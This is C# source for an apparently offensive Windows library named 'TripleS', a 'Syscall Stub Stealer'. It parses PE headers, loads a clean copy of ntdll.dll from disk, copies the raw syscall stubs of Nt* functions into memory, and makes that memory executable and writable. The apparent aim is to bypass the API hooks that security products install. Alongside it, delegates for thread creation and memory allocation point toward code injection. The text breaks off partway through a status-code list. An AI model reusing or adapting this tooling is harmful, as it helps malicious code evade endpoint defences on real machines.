using System;
using System.Runtime;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Collections;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.IO;

public class PEReader
{
    public struct IMAGE_DOS_HEADER
    {      // DOS .EXE header
        public UInt16 e_magic;              // Magic number
        public UInt16 e_cblp;               // Bytes on last page of file
        public UInt16 e_cp;                 // Pages in file
        public UInt16 e_crlc;               // Relocations
        public UInt16 e_cparhdr;            // Size of header in paragraphs
        public UInt16 e_minalloc;           // Minimum extra paragraphs needed
        public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
        public UInt16 e_ss;                 // Initial (relative) SS value
        public UInt16 e_sp;                 // Initial SP value
        public UInt16 e_csum;               // Checksum
        public UInt16 e_ip;                 // Initial IP value
        public UInt16 e_cs;                 // Initial (relative) CS value
        public UInt16 e_lfarlc;             // File address of relocation table
        public UInt16 e_ovno;               // Overlay number
        public UInt16 e_res_0;              // Reserved words
        public UInt16 e_res_1;              // Reserved words
        public UInt16 e_res_2;              // Reserved words
        public UInt16 e_res_3;              // Reserved words
        public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
        public UInt16 e_oeminfo;            // OEM information; e_oemid specific
        public UInt16 e_res2_0;             // Reserved words
        public UInt16 e_res2_1;             // Reserved words
        public UInt16 e_res2_2;             // Reserved words
        public UInt16 e_res2_3;             // Reserved words
        public UInt16 e_res2_4;             // Reserved words
        public UInt16 e_res2_5;             // Reserved words
        public UInt16 e_res2_6;             // Reserved words
        public UInt16 e_res2_7;             // Reserved words
        public UInt16 e_res2_8;             // Reserved words
        public UInt16 e_res2_9;             // Reserved words
        public UInt32 e_lfanew;             // File address of new exe header
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_DATA_DIRECTORY
    {
        public UInt32 VirtualAddress;
        public UInt32 Size;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_OPTIONAL_HEADER32
    {
        public UInt16 Magic;
        public Byte MajorLinkerVersion;
        public Byte MinorLinkerVersion;
        public UInt32 SizeOfCode;
        public UInt32 SizeOfInitializedData;
        public UInt32 SizeOfUninitializedData;
        public UInt32 AddressOfEntryPoint;
        public UInt32 BaseOfCode;
        public UInt32 BaseOfData;
        public UInt32 ImageBase;
        public UInt32 SectionAlignment;
        public UInt32 FileAlignment;
        public UInt16 MajorOperatingSystemVersion;
        public UInt16 MinorOperatingSystemVersion;
        public UInt16 MajorImageVersion;
        public UInt16 MinorImageVersion;
        public UInt16 MajorSubsystemVersion;
        public UInt16 MinorSubsystemVersion;
        public UInt32 Win32VersionValue;
        public UInt32 SizeOfImage;
        public UInt32 SizeOfHeaders;
        public UInt32 CheckSum;
        public UInt16 Subsystem;
        public UInt16 DllCharacteristics;
        public UInt32 SizeOfStackReserve;
        public UInt32 SizeOfStackCommit;
        public UInt32 SizeOfHeapReserve;
        public UInt32 SizeOfHeapCommit;
        public UInt32 LoaderFlags;
        public UInt32 NumberOfRvaAndSizes;

        public IMAGE_DATA_DIRECTORY ExportTable;
        public IMAGE_DATA_DIRECTORY ImportTable;
        public IMAGE_DATA_DIRECTORY ResourceTable;
        public IMAGE_DATA_DIRECTORY ExceptionTable;
        public IMAGE_DATA_DIRECTORY CertificateTable;
        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
        public IMAGE_DATA_DIRECTORY Debug;
        public IMAGE_DATA_DIRECTORY Architecture;
        public IMAGE_DATA_DIRECTORY GlobalPtr;
        public IMAGE_DATA_DIRECTORY TLSTable;
        public IMAGE_DATA_DIRECTORY LoadConfigTable;
        public IMAGE_DATA_DIRECTORY BoundImport;
        public IMAGE_DATA_DIRECTORY IAT;
        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
        public IMAGE_DATA_DIRECTORY Reserved;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_OPTIONAL_HEADER64
    {
        public UInt16 Magic;
        public Byte MajorLinkerVersion;
        public Byte MinorLinkerVersion;
        public UInt32 SizeOfCode;
        public UInt32 SizeOfInitializedData;
        public UInt32 SizeOfUninitializedData;
        public UInt32 AddressOfEntryPoint;
        public UInt32 BaseOfCode;
        public UInt64 ImageBase;
        public UInt32 SectionAlignment;
        public UInt32 FileAlignment;
        public UInt16 MajorOperatingSystemVersion;
        public UInt16 MinorOperatingSystemVersion;
        public UInt16 MajorImageVersion;
        public UInt16 MinorImageVersion;
        public UInt16 MajorSubsystemVersion;
        public UInt16 MinorSubsystemVersion;
        public UInt32 Win32VersionValue;
        public UInt32 SizeOfImage;
        public UInt32 SizeOfHeaders;
        public UInt32 CheckSum;
        public UInt16 Subsystem;
        public UInt16 DllCharacteristics;
        public UInt64 SizeOfStackReserve;
        public UInt64 SizeOfStackCommit;
        public UInt64 SizeOfHeapReserve;
        public UInt64 SizeOfHeapCommit;
        public UInt32 LoaderFlags;
        public UInt32 NumberOfRvaAndSizes;

        public IMAGE_DATA_DIRECTORY ExportTable;
        public IMAGE_DATA_DIRECTORY ImportTable;
        public IMAGE_DATA_DIRECTORY ResourceTable;
        public IMAGE_DATA_DIRECTORY ExceptionTable;
        public IMAGE_DATA_DIRECTORY CertificateTable;
        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
        public IMAGE_DATA_DIRECTORY Debug;
        public IMAGE_DATA_DIRECTORY Architecture;
        public IMAGE_DATA_DIRECTORY GlobalPtr;
        public IMAGE_DATA_DIRECTORY TLSTable;
        public IMAGE_DATA_DIRECTORY LoadConfigTable;
        public IMAGE_DATA_DIRECTORY BoundImport;
        public IMAGE_DATA_DIRECTORY IAT;
        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
        public IMAGE_DATA_DIRECTORY Reserved;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_FILE_HEADER
    {
        public UInt16 Machine;
        public UInt16 NumberOfSections;
        public UInt32 TimeDateStamp;
        public UInt32 PointerToSymbolTable;
        public UInt32 NumberOfSymbols;
        public UInt16 SizeOfOptionalHeader;
        public UInt16 Characteristics;
    }

    [StructLayout(LayoutKind.Explicit)]
    public struct IMAGE_SECTION_HEADER
    {
        [FieldOffset(0)]
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public char[] Name;
        [FieldOffset(8)]
        public UInt32 VirtualSize;
        [FieldOffset(12)]
        public UInt32 VirtualAddress;
        [FieldOffset(16)]
        public UInt32 SizeOfRawData;
        [FieldOffset(20)]
        public UInt32 PointerToRawData;
        [FieldOffset(24)]
        public UInt32 PointerToRelocations;
        [FieldOffset(28)]
        public UInt32 PointerToLinenumbers;
        [FieldOffset(32)]
        public UInt16 NumberOfRelocations;
        [FieldOffset(34)]
        public UInt16 NumberOfLinenumbers;
        [FieldOffset(36)]
        public DataSectionFlags Characteristics;

        public string Section
        {
            get { 
                int i = Name.Length - 1;
                while (Name[i] == 0) {
                    --i;
                }
                char[] NameCleaned = new char[i+1];
                Array.Copy(Name, NameCleaned, i+1);
                return new string(NameCleaned); 
            }
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_BASE_RELOCATION
    {
        public uint VirtualAdress;
        public uint SizeOfBlock;
    }

    [Flags]
    public enum DataSectionFlags : uint
    {

        Stub = 0x00000000,

    }


    /// The DOS header

    private IMAGE_DOS_HEADER dosHeader;

    /// The file header

    private IMAGE_FILE_HEADER fileHeader;

    /// Optional 32 bit file header 

    private IMAGE_OPTIONAL_HEADER32 optionalHeader32;

    /// Optional 64 bit file header 

    private IMAGE_OPTIONAL_HEADER64 optionalHeader64;

    /// Image Section headers. Number of sections is in the file header.

    private IMAGE_SECTION_HEADER[] imageSectionHeaders;

    private byte[] rawbytes;



    public PEReader(string filePath)
    {
        // Read in the DLL or EXE and get the timestamp
        using (FileStream stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
        {
            BinaryReader reader = new BinaryReader(stream);
            dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

            // Add 4 bytes to the offset
            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

            UInt32 ntHeadersSignature = reader.ReadUInt32();
            fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
            if (this.Is32BitHeader)
            {
                optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
            }
            else
            {
                optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
            }

            imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
            for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
            {
                imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
            }

            rawbytes = System.IO.File.ReadAllBytes(filePath);

        }
    }

    public PEReader(byte[] fileBytes)
    {
        // Read in the DLL or EXE and get the timestamp
        using (MemoryStream stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
        {
            BinaryReader reader = new BinaryReader(stream);
            dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

            // Add 4 bytes to the offset
            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

            UInt32 ntHeadersSignature = reader.ReadUInt32();
            fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
            if (this.Is32BitHeader)
            {
                optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
            }
            else
            {
                optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
            }

            imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
            for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
            {
                imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
            }

            rawbytes = fileBytes;

        }
    }


    public static T FromBinaryReader<T>(BinaryReader reader)
    {
        // Read in a byte array
        byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

        // Pin the managed memory while, copy it out the data, then unpin it
        GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
        T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
        handle.Free();

        return theStructure;
    }



    public bool Is32BitHeader
    {
        get
        {
            UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
            return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
        }
    }


    public IMAGE_FILE_HEADER FileHeader
    {
        get
        {
            return fileHeader;
        }
    }


    /// Gets the optional header

    public IMAGE_OPTIONAL_HEADER32 OptionalHeader32
    {
        get
        {
            return optionalHeader32;
        }
    }


    /// Gets the optional header

    public IMAGE_OPTIONAL_HEADER64 OptionalHeader64
    {
        get
        {
            return optionalHeader64;
        }
    }

    public IMAGE_SECTION_HEADER[] ImageSectionHeaders
    {
        get
        {
            return imageSectionHeaders;
        }
    }

    public byte[] RawBytes
    {
        get
        {
            return rawbytes;
        }

    }

}

// ---code for usage example---
public class ShitsForUsageExample {

    [Flags]
    public enum AllocationType : ulong
    {
        Commit = 0x1000,
        Reserve = 0x2000,
        Decommit = 0x4000,
        Release = 0x8000,
        Reset = 0x80000,
        Physical = 0x400000,
        TopDown = 0x100000,
        WriteWatch = 0x200000,
        LargePages = 0x20000000
    };

    [Flags]
    public enum ACCESS_MASK : uint
    {
        DELETE = 0x00010000,
        READ_CONTROL = 0x00020000,
        WRITE_DAC = 0x00040000,
        WRITE_OWNER = 0x00080000,
        SYNCHRONIZE = 0x00100000,
        STANDARD_RIGHTS_REQUIRED = 0x000F0000,
        STANDARD_RIGHTS_READ = 0x00020000,
        STANDARD_RIGHTS_WRITE = 0x00020000,
        STANDARD_RIGHTS_EXECUTE = 0x00020000,
        STANDARD_RIGHTS_ALL = 0x001F0000,
        SPECIFIC_RIGHTS_ALL = 0x0000FFF,
        ACCESS_SYSTEM_SECURITY = 0x01000000,
        MAXIMUM_ALLOWED = 0x02000000,
        GENERIC_READ = 0x80000000,
        GENERIC_WRITE = 0x40000000,
        GENERIC_EXECUTE = 0x20000000,
        GENERIC_ALL = 0x10000000,
        DESKTOP_READOBJECTS = 0x00000001,
        DESKTOP_CREATEWINDOW = 0x00000002,
        DESKTOP_CREATEMENU = 0x00000004,
        DESKTOP_HOOKCONTROL = 0x00000008,
        DESKTOP_JOURNALRECORD = 0x00000010,
        DESKTOP_JOURNALPLAYBACK = 0x00000020,
        DESKTOP_ENUMERATE = 0x00000040,
        DESKTOP_WRITEOBJECTS = 0x00000080,
        DESKTOP_SWITCHDESKTOP = 0x00000100,
        WINSTA_ENUMDESKTOPS = 0x00000001,
        WINSTA_READATTRIBUTES = 0x00000002,
        WINSTA_ACCESSCLIPBOARD = 0x00000004,
        WINSTA_CREATEDESKTOP = 0x00000008,
        WINSTA_WRITEATTRIBUTES = 0x00000010,
        WINSTA_ACCESSGLOBALATOMS = 0x00000020,
        WINSTA_EXITWINDOWS = 0x00000040,
        WINSTA_ENUMERATE = 0x00000100,
        WINSTA_READSCREEN = 0x00000200,
        WINSTA_ALL_ACCESS = 0x0000037F,

        SECTION_ALL_ACCESS = 0x10000000,
        SECTION_QUERY = 0x0001,
        SECTION_MAP_WRITE = 0x0002,
        SECTION_MAP_READ = 0x0004,
        SECTION_MAP_EXECUTE = 0x0008,
        SECTION_EXTEND_SIZE = 0x0010
    };

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NTCTE(
        out IntPtr threadHandle,
        ACCESS_MASK desiredAccess,
        IntPtr objectAttributes,
        IntPtr processHandle,
        IntPtr startAddress,
        IntPtr parameter,
        bool createSuspended,
        int stackZeroBits,
        int sizeOfStack,
        int maximumStackSize,
        IntPtr attributeList);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NTPVM(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        ref IntPtr RegionSize,
        UInt32 NewProtect,
        ref UInt32 OldProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NTAVM(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref IntPtr RegionSize,
        UInt32 AllocationType,
        UInt32 Protect);
}
// ---code for usage example---

public class TripleS {

    public static UInt32 PAGE_READWRITE = 0x04; 
    public static UInt32 PAGE_EXECUTE_READ = 0x20;

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NTPVMDelegate(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        ref IntPtr RegionSize,
        UInt32 NewProtect,
        ref UInt32 OldProtect);

    [Flags]
    public enum AllocationType : ulong
    {
        Commit = 0x1000,
        Reserve = 0x2000,
        Decommit = 0x4000,
        Release = 0x8000,
        Reset = 0x80000,
        Physical = 0x400000,
        TopDown = 0x100000,
        WriteWatch = 0x200000,
        LargePages = 0x20000000
    };

    // preventing IAT hooking to TripleS
    public static bool NTPVM(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect) {
        // Craft an array for the arguments
        OldProtect = 0;
        object[] funcargs = { ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect };

        // get NtProtectVirtualMemory's pointer
        IntPtr NTDLLHandleInMemory = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => "ntdll.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
        IntPtr pNTPVM = GetExportAddress(NTDLLHandleInMemory, "NtProtectVirtualMemory");
        // dynamicly invoke NtProtectVirtualMemory
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(pNTPVM, typeof(NTPVMDelegate));
        NTSTATUS NTSTATUS = (NTSTATUS)funcDelegate.DynamicInvoke(funcargs);

        if (NTSTATUS != NTSTATUS.Success) {
            return false;
        }else {
            OldProtect = (UInt32)funcargs[4];
        }
        return true;
    }

	public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName) {
        IntPtr FunctionPtr = IntPtr.Zero;
        try {
            // Traverse the PE header in memory
            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            Int64 pExport = 0;
            if (Magic == 0x010b) {
                pExport = OptHeader + 0x60;
            }
            else {
                pExport = OptHeader + 0x70;
            }

            // Read -> IMAGE_EXPORT_DIRECTORY
            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            // Loop the array of export name RVA's
            for (int i = 0; i < NumberOfNames; i++) {
                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase)) {
                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                    break;
                }
            }
        }
        catch {
            // Catch parser failure
            throw new InvalidOperationException("Failed to parse module exports.");
        }

        if (FunctionPtr == IntPtr.Zero) {
            // Export not found
            throw new MissingMethodException(ExportName + " not found.");
        }
        return FunctionPtr;
    }

    public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName, ref int FunctionSize) {
        IntPtr FunctionPtr = IntPtr.Zero;
        try {
            // Traverse the PE header in memory
            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            Int64 pExport = 0;
            if (Magic == 0x010b) {
                pExport = OptHeader + 0x60;
            }
            else {
                pExport = OptHeader + 0x70;
            }

            // Read -> IMAGE_EXPORT_DIRECTORY
            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            // create a new dictionary for the function pointers
            var FunctionPointersList = new List<Int64>();

            int WantedFunctionIndex = 0;
            for (int i = 0; i < NumberOfNames; i++) {
                string CurrentFunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                Int32 CurrentFunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                Int32 CurrentFunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (CurrentFunctionOrdinal - OrdinalBase))));
                IntPtr CurrentFunctionPtr = (IntPtr)((Int64)ModuleBase + CurrentFunctionRVA);
                FunctionPointersList.Add((Int64)CurrentFunctionPtr);
                if (CurrentFunctionName == ExportName) {
                    WantedFunctionIndex = i;
                }
            }

            if (WantedFunctionIndex == 0) {
                // Export not found
                throw new MissingMethodException(ExportName + " not found.");
            }

            IntPtr WantedFunctionAddress = (IntPtr)FunctionPointersList[WantedFunctionIndex];
            FunctionPointersList.Sort();
            FunctionPointersList = FunctionPointersList.Distinct().ToList();
            int WantedFunctionIndexSorted = FunctionPointersList.IndexOf((Int64)WantedFunctionAddress);
            IntPtr NextFunctionPointer = (IntPtr)FunctionPointersList[WantedFunctionIndexSorted + 1];
            FunctionSize = (Int32)((Int64)NextFunctionPointer - (Int64)WantedFunctionAddress);
            FunctionPtr = WantedFunctionAddress;
        }
        catch {
            // Catch parser failure
            throw new InvalidOperationException("Failed to parse module exports.");
        }
        return FunctionPtr;
    }

    public static IntPtr StealSyscallStub(string FuncName) {
        Console.WriteLine("[TripleS - Syscall Stub Stealer]");
        Console.WriteLine("[   Written By GetRektBoy724   ]");
        IntPtr output = IntPtr.Zero;
        if (!FuncName.StartsWith("Nt")) {
            throw new InvalidOperationException("TripleS can only steals pure NT APIs!");
        }
		Console.WriteLine("[*] Getting NTDLL full path...");
		// get NTDLL full path
		string NTDLLFullPath;
        try{ NTDLLFullPath = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => "ntdll.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName); }catch{ NTDLLFullPath = null; }
        if (NTDLLFullPath != null) {
        	Console.WriteLine("[*] Reading original NTDLL from disk...");
        	// allocate and copy original DLL to unmanaged memory
        	byte[] NTDLLBytes = System.IO.File.ReadAllBytes(NTDLLFullPath);
            PEReader NTDLL = new PEReader(NTDLLBytes);
            int RegionSize = NTDLL.Is32BitHeader ? (int)NTDLL.OptionalHeader32.SizeOfImage : (int)NTDLL.OptionalHeader64.SizeOfImage;
            int SizeOfHeaders = NTDLL.Is32BitHeader ? (int)NTDLL.OptionalHeader32.SizeOfHeaders : (int)NTDLL.OptionalHeader64.SizeOfHeaders;
            IntPtr pNTDLLImage = Marshal.AllocHGlobal(RegionSize);
            // copying image header
            Marshal.Copy(NTDLLBytes, 0, pNTDLLImage, SizeOfHeaders);
            // copying sections
            for (int i = 0; i < NTDLL.FileHeader.NumberOfSections; i++) {
                IntPtr pVASectionBase = (IntPtr)((UInt64)pNTDLLImage + NTDLL.ImageSectionHeaders[i].VirtualAddress);
                Marshal.Copy(NTDLLBytes, (int)NTDLL.ImageSectionHeaders[i].PointerToRawData, pVASectionBase, (int)NTDLL.ImageSectionHeaders[i].SizeOfRawData);
            }
            // get pointer to function
            Console.WriteLine("[*] Getting pointer to function {0}...", FuncName);
            int FuncSize = 0;
        	IntPtr pFunc = GetExportAddress(pNTDLLImage, FuncName, ref FuncSize);
            // copy from the function pointer to the allocated memory for syscall stub
            Console.WriteLine("[*] Copying syscall stub to allocated memory...");
            // allocate unmanaged memory for the syscall stub
            IntPtr pSyscallStub = Marshal.AllocHGlobal(FuncSize);
            byte[] bSyscallStub = new byte[FuncSize];
            Marshal.Copy(pFunc, bSyscallStub, 0, FuncSize);
            Marshal.Copy(bSyscallStub, 0, pSyscallStub, FuncSize);
            // change syscall stub memory to RWX
            uint oldProtect = 0;
            IntPtr SyscallStubSizePointer = new IntPtr(FuncSize);
            NTPVM((IntPtr)(-1), ref pSyscallStub, ref SyscallStubSizePointer, 0x40, ref oldProtect);
            // free temporary allocations
            Marshal.FreeHGlobal(pNTDLLImage);
            Console.WriteLine("[+] Syscall stub of {0} is hot and ready!", FuncName);
            output = pSyscallStub;
            return output;
        }else {
        	Console.WriteLine("[-] Failed to get NTDLL path.");
            return output;
        }
	}

    public static IntPtr StealSyscallStubSilently(string FuncName) {
        IntPtr output = IntPtr.Zero;
        if (!FuncName.StartsWith("Nt")) {
            throw new InvalidOperationException("TripleS can only steals pure NT APIs!");
        }
        // get NTDLL full path
        string NTDLLFullPath;
        try{ NTDLLFullPath = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => "ntdll.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName); }catch{ NTDLLFullPath = null; }
        if (NTDLLFullPath != null) {
            // allocate and copy original DLL to unmanaged memory
            byte[] NTDLLBytes = System.IO.File.ReadAllBytes(NTDLLFullPath);
            PEReader NTDLL = new PEReader(NTDLLBytes);
            int RegionSize = NTDLL.Is32BitHeader ? (int)NTDLL.OptionalHeader32.SizeOfImage : (int)NTDLL.OptionalHeader64.SizeOfImage;
            int SizeOfHeaders = NTDLL.Is32BitHeader ? (int)NTDLL.OptionalHeader32.SizeOfHeaders : (int)NTDLL.OptionalHeader64.SizeOfHeaders;
            IntPtr pNTDLLImage = Marshal.AllocHGlobal(RegionSize);
            // copying image header
            Marshal.Copy(NTDLLBytes, 0, pNTDLLImage, SizeOfHeaders);
            // copying sections
            for (int i = 0; i < NTDLL.FileHeader.NumberOfSections; i++) {
                IntPtr pVASectionBase = (IntPtr)((UInt64)pNTDLLImage + NTDLL.ImageSectionHeaders[i].VirtualAddress);
                Marshal.Copy(NTDLLBytes, (int)NTDLL.ImageSectionHeaders[i].PointerToRawData, pVASectionBase, (int)NTDLL.ImageSectionHeaders[i].SizeOfRawData);
            }
            // get pointer to function
            int FuncSize = 0;
            IntPtr pFunc = GetExportAddress(pNTDLLImage, FuncName, ref FuncSize);
            // copy from the function pointer to the allocated memory for syscall stub
            // allocate unmanaged memory for the syscall stub
            IntPtr pSyscallStub = Marshal.AllocHGlobal(FuncSize);
            byte[] bSyscallStub = new byte[FuncSize];
            Marshal.Copy(pFunc, bSyscallStub, 0, FuncSize);
            Marshal.Copy(bSyscallStub, 0, pSyscallStub, FuncSize);
            // change syscall stub memory to RWX
            uint oldProtect = 0;
            IntPtr SyscallStubSizePointer = new IntPtr(FuncSize);
            NTPVM((IntPtr)(-1), ref pSyscallStub, ref SyscallStubSizePointer, 0x40, ref oldProtect);
            // free temporary allocations
            Marshal.FreeHGlobal(pNTDLLImage);
            Console.WriteLine("[+] Syscall stub of {0} is stolen with TripleS!", FuncName);
            output = pSyscallStub;
            return output;
        }else {
            Console.WriteLine("Failed to get NTDLL path.");
            return output;
        }
    }

    public enum NTSTATUS : uint
    {
        // Success
        Success = 0x00000000,
        Wait0 = 0x00000000,
        Wait1 = 0x00000001,
        Wait2 = 0x00000002,
        Wait3 = 0x00000003,
        Wait63 = 0x0000003f,
        Abandoned = 0x00000080,
        AbandonedWait0 = 0x00000080,
        AbandonedWait1 = 0x00000081,
        AbandonedWait2 = 0x00000082,
        AbandonedWait3 = 0x00000083,
        AbandonedWait63 = 0x000000bf,
        UserApc = 0x000000c0,
        KernelApc = 0x00000100,
        Alerted = 0x00000101,
        Timeout = 0x00000102,
        Pending = 0x00000103,
        Reparse = 0x00000104,
        MoreEntries = 0x00000105,
        NotAllAssigned = 0x00000106,
        SomeNotMapped = 0x00000107,
        OpLockBreakInProgress = 0x00000108,
        VolumeMounted = 0x00000109,
        RxActCommitted = 0x0000010a,
        NotifyCleanup = 0x0000010b,
        NotifyEnumDir = 0x0000010c,
        NoQuotasForAccount = 0x0000010d,
        PrimaryTransportConnectFailed = 0x0000010e,
        PageFaultTransition = 0x00000110,
        PageFaultDemandZero = 0x00000111,
        PageFaultCopyOnWrite = 0x00000112,
        PageFaultGuardPage = 0x00000113,
        PageFaultPagingFile = 0x00000114,
        CrashDump = 0x00000116,
        ReparseObject = 0x00000118,
        NothingToTerminate = 0x00000122,
        ProcessNotInJob = 0x00000123,
        ProcessInJob = 0x00000124,
        ProcessCloned = 0x00000129,
        FileLockedWithOnlyReaders = 0x0000012a,
        FileLockedWithWriters = 0x0000012b,

        // Informational
        Informational = 0x40000000,
        ObjectNameExists = 0x40000000,
        ThreadWasSuspended = 0x40000001,
        WorkingSetLimitRange = 0x40000002,
        ImageNotAtBase = 0x40000003,
        RegistryRecovered = 0x40000009,

        // Warning
        Warning = 0x80000000,
        GuardPageViolation = 0x80000001,
        DatatypeMisalignment = 0x80000002,
        Breakpoint = 0x80000003,
        SingleStep = 0x80000004,
        BufferOverflow = 0x80000005,
        NoMoreFiles = 0x80000006,
        HandlesClosed = 0x8000000a,
        PartialCopy = 0x8000000d,
        DeviceBusy = 0x80000011,
        InvalidEaName = 0x80000013,
        EaListInconsistent = 0x80000014,
        NoMoreEntries = 0x8000001a,
        LongJump = 0x80000026,
        DllMightBeInsecure = 0x8000002b,

        // Error
        Error = 0xc0000000,
        Unsuccessful = 0xc0000001,
        NotImplemented = 0xc0000002,
        InvalidInfoClass = 0xc0000003,
        InfoLengthMismatch = 0xc0000004,
        AccessViolation = 0xc0000005,
        InPageError = 0xc0000006,
